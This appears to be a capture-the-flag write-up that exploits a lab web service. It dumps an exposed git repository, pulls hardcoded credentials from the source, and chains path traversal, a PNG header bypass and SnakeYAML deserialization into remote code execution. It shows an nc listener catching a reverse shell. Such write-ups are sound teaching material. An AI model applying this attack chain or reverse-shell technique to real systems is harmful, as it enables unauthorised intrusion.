# Solution

Initial visit to the web challenge offers Basic authentication prompt. The majority of the web application is secured and bruteforcing will not result in much.

The initial step is to fully enumerate by crawling for endpoints with wordlists. One request should completely stand out:
```
$ curl 172.17.0.2:8080/git/HEAD
ref: refs/heads/master
```

This known endpoint vector, along with several others (e.g. COMMIT\_EDITMSG, ...) should point out that there is a git repository exposed for this web service.

## Getting the source

Downloading the git repository is fairly easy, you can use `git-dumper`, but there are also other good tools such as `dvcs-ripper` available. If `git-dumper` is the chosen tool, keep in mind that all `.git` paths must be refactored to `git` in order for the script to work:
```
$ python3 git_dumper.py http://172.17.0.2:8080/.git test
[-] Testing http://172.17.0.2:8080/git/HEAD [200]
[-] Testing http://172.17.0.2:8080/git/ [200]
[-] Fetching common files
...
[-] Fetching http://172.17.0.2:8080/git/objects/8b/e0b79f560a7834bf220bbd1ea7bda64d685bd3 [200]
[-] Running git checkout .
$ cd test && ls
git
$ mv git .git
$ git checkout .
Updated 21 paths from the index
$ ls
pom.xml  src
```

## Obtaining credentials

Now when we have the source code authentication credentials are easily readable:
```
$ cd src/main/java/org/ibctf/cloud/auth
$ cat BasicAuthenticationProvider.java 
package org.ibctf.cloud.auth;

...
            if (authenticationRequest.getIdentity().equals("liberty") &&
                    authenticationRequest.getSecret().equals("Liberty@0")) {
...
```

When testing username `liberty` and password `Liberty@0` against the web service, we are responded back with an interesting path:
```
$ curl -u "liberty:Liberty@0" http://172.17.0.2:8080/ -i
HTTP/1.1 303 See Other
location: /cloud
date: Wed, 4 Jan 2023 14:29:52 GMT
connection: keep-alive
transfer-encoding: chunked

$ curl -u "liberty:Liberty@0" http://172.17.0.2:8080/cloud -i
HTTP/1.1 201 Created
date: Wed, 4 Jan 2023 14:29:56 GMT
Content-Type: application/json
content-length: 51
connection: keep-alive

{"path":"/ws/e30ecf95-a33e-47c7-8fb3-6a133fb688a1"}
```

## Determining websocket path from code

Further inspection of code reveals a websocket server running behind that endpoint with ability to initiate different operations:
```
@ServerWebSocket("/ws/{topic}")
@Secured(SecurityRule.IS_ANONYMOUS)
public class WebSocketServer {
...
    @OnMessage
    public Publisher<WebSocketResponse> onMessage(String topic, @Valid WebSocketRequest message, WebSocketSession session) {
        WebSocketResponse r = null;
        switch (message.getRequestType()) {
            case WebSocketRequest.REQUEST_NEW_FILE -> r = newFile(topic, message);
            case WebSocketRequest.REQUEST_DELETE_FILE -> r = deleteFile(message);
            case WebSocketRequest.REQUEST_ABORT -> r = abort(message);
            case WebSocketRequest.REQUEST_LIST_FILES -> r = listFiles(topic);
            case WebSocketRequest.REQUEST_LIST_UUID -> r = listUuid(message);
            case WebSocketRequest.REQUEST_QUIT -> {
                Publisher<WebSocketResponse> resp = session.send(new WebSocketResponse<>(WebSocketStatus.OK, "Disconnecting"));
                session.close(CloseReason.NORMAL);
                return resp;
            }
        }
        return session.send(r);
    }
...
}
```

We can easily interact with the websocket server via python websockets to test out those features:
```
$ python3 -m websockets ws://172.17.0.2:8080/ws/4810facb-ef95-4db9-90a6-5e12bd49d173
Connected to ws://172.17.0.2:8080/ws/4810facb-ef95-4db9-90a6-5e12bd49d173.
< {"statusCode":"OK","message":"Connected"}
> {"requestType": 1, "message": "myfile"}
< {"statusCode":"OK","message":"6c16e4b3-5257-4908-9841-63a8fcebcf1c"}
> {"requestType": 2, "message": "6c16e4b3-5257-4908-9841-63a8fcebcf1c"}
< {"statusCode":"ERROR","message":"File not uploaded"}
> {"requestType": 3, "message": "6c16e4b3-5257-4908-9841-63a8fcebcf1c"}
< {"statusCode":"OK","message":"6c16e4b3-5257-4908-9841-63a8fcebcf1c"}
> {"requestType": 4, "message": "6c16e4b3-5257-4908-9841-63a8fcebcf1c"}
< {"statusCode":"OK"}
> 
```

## Performing code review

The web service contains multiple issues. Let's find them all to build a proper attack chain.

### YAML deserialization is vulnerable - CVE-2022-1471

All YAML deserialization implementations leverage SnakeYAML in a wrong manner. Due to this, there is a possibility to execute code:
```
@Post(value = "/cloud/config", consumes = {MediaType.APPLICATION_YAML})
public HttpResponse config(@Body byte[] payload, HttpRequest request) {
    InetSocketAddress addr = request.getRemoteAddress();
    if (!addr.getAddress().isLoopbackAddress()) {
        return HttpResponse.unauthorized();
    }

    Yaml yaml = new Yaml();
    Notification n = yaml.load(new String(payload));
...
```

### Files can be uploaded to an arbitrary path inside data folder

During file upload operation via websocket, the specified name is checked whether its path falls under `data` folder:
```
private WebSocketResponse newFile(String topic, WebSocketRequest message) {
    Optional<FileTopic> optional = fileTopicRepository.findByTopic(topic);
    if (optional.isEmpty()) {
        return RESP_NOT_FOUND;
    }

    Path p = Path.of(Application.FOLDER_FILES.toString(), message.getMessage());
    if (!p.normalize().toAbsolutePath().startsWith(Application.FOLDER_DATA.toAbsolutePath())) {
        return new WebSocketResponse<>(WebSocketStatus.ERROR, "Invalid name");
    }
```

This means that one is still capable to upload files into other folders inside the `data` folder (in this case `scripts` and `configs` alongside `files`).

### File header check can be circumvented

Users don't have the capability to upload YAML files or scripts due to the remote address check against `localhost`. The only upload capability for users is the PNG files under `/cloud/{uuid}` which checks the first 4 bytes of the file against a PNG header. This can still be "circumvented" by uploading other valid file types and specifying its first 4 bytes as PNG header.
```
@Post(value = "/cloud/{uuid}", consumes = {MediaType.IMAGE_PNG})
@Secured(SecurityRule.IS_AUTHENTICATED)
public HttpResponse upload(@Body byte[] payload, String uuid) {
    if (!checkHeader(payload, PNG_HEADER)) {
        return HttpResponse.badRequest(Map.of("message", "only PNG supported"));
    }
...
```

### Execution of ScriptService is unsafe

ScriptService executes `runAll` inside its own constructor which is considered unsafe. Only instantiation of ScriptService is needed in order to run potentially malicious scripts in the `data/scripts/` folder.
```
public ScriptService() throws Exception {
    this.results = new HashMap<>();
    runAll();
}
...
    try (Stream<Path> paths = Files.walk(Application.FOLDER_SCRIPTS)) {
        paths.filter(Files::isRegularFile).forEach(path -> {
            try {
                ProcessBuilder pb = new ProcessBuilder("/bin/sh", path.toString());
                Process p = pb.start();
...
```

## Executing complete attack chain

With all previous issues found during code review, we can execute the following attack chain and obtain RCE:
- retrieve websocket topic with hardcoded credentials
- connect to websocket and initiate 3 uploads
  - one that uploads a script (leverage path traversal): `../scripts/script.sh`
  - one that uploads a malicious YAML file (leverage path traversal): `../configs/config.yml`
  - one that executes the notification service which will run the process of YAML deserialization
- all uploads must contain `\x89PNG` at the start of file

The aformentioned steps will force the web service to:
- accept all uploads as PNG due to first 4 bytes conforming to PNG magic header
- attempt deserialization of malicious YAML file and executing the `ScriptService` constructor, `\x89PNG` is considered as object instance field and thus ignored
- running `ScriptService` against our malicious script and executing code, the `\x89PNG` will be ignored as _unknown command_

Complete chain is written in `solve.py`:
```
$ nc -nlvp 4444
Listening on 0.0.0.0 4444
^Z
[1]+  Stopped                 nc -nlvp 4444
$ python3 solve.py 
Got path: /ws/5118053c-03cc-4524-92f4-b39a35e4fc32
{"statusCode":"OK","message":"Connected"}
{"statusCode":"OK","message":"8b2ddd70-ea50-4856-b6c8-a722c940c961"}
{"statusCode":"OK","message":"e2fb4509-02a4-4486-83dc-6f9f7d5b1e10"}
{"statusCode":"OK","message":"7dc62ca5-791b-497b-a49f-63cdc46557bd"}
^Z
[2]+  Stopped                 python3 solve.py
$ fg 1
nc -nlvp 4444
Connection received on 172.17.0.2 38632
bash-4.4$ id
id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
bash-4.4$ cat flag.txt
cat flag.txt
ibctf{h3-w3nt_f0r_TH3_cl0udzz-but-g0t_t0-th3-ST4RZ-1nst34d}
bash-4.4$ 
```
